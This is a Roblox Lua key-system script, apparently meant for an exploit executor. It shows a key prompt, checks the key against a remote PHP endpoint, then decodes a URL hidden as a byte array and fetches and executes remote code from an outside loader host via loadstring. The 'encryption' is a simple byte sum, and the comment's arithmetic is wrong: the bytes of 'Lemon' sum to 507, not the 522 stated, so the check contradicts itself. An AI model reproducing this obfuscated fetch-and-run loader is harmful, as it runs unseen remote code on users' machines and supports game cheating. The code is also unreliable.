--// RobloxScriptKey Key System with online check + encrypted loader
local HttpService = game:GetService("HttpService")

-- Encrypted key (Lemon -> math sum)
local function encodeKey(str)
    local sum = 0
    for i = 1, #str do
        sum = sum + string.byte(str, i)
    end
    return sum
end
local correctKeySum = 522 -- Lemon = 76+101+109+111+110

-- GUI
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "KeySystem"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, 0, 0, 30)
label.Text = "🔑 Please enter your key:"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
label.Font = Enum.Font.SourceSansBold
label.TextSize = 20

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.9, 0, 0, 30)
box.Position = UDim2.new(0.05, 0, 0, 40)
box.PlaceholderText = "Enter your key here"
box.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.TextSize = 18
box.Font = Enum.Font.SourceSans

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.9, 0, 0, 30)
button.Position = UDim2.new(0.05, 0, 0, 80)
button.Text = "✅ Submit"
button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.SourceSansBold
button.TextSize = 18

-- Encrypted loader URL (luarmor)
local encryptedURL = {114,104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,47,102,105,108,101,115,47,118,51,47,108,111,97,100,101,114,115,47,102,102,100,102,101,97,100,102,48,97,102,55,57,56,55,52,49,56,48,54,101,97,52,48,52,54,56,50,97,57,51,56,46,108,117,97}
local function decode(tbl)
    local s = ""
    for _, v in pairs(tbl) do
        s = s .. string.char(v)
    end
    return s
end

-- URL for online key check
local checkURL = "https://ajjankeysystem.infinityfreeapp.com/check.php"

button.MouseButton1Click:Connect(function()
    local input = box.Text
    local sum = encodeKey(input)

    -- local key check
    if sum ~= correctKeySum then
        button.Text = "❌ Invalid Key"
        wait(1)
        button.Text = "✅ Submit"
        return
    end

    -- online key verification
    local url = checkURL .. "?key=" .. HttpService:UrlEncode(input)
    local success, response = pcall(function()
        return HttpService:GetAsync(url)
    end)

    if success then
        local result = HttpService:JSONDecode(response)
        if result["success"] == true then
            frame:Destroy()
            -- load encrypted loader
            loadstring(game:HttpGet(decode(encryptedURL)))()
        else
            button.Text = "❌ Key Invalid (Server)"
            wait(1)
            button.Text = "✅ Submit"
        end
    else
        button.Text = "⚠️ Server Unreachable"
        wait(1)
        button.Text = "✅ Submit"
    end
end)
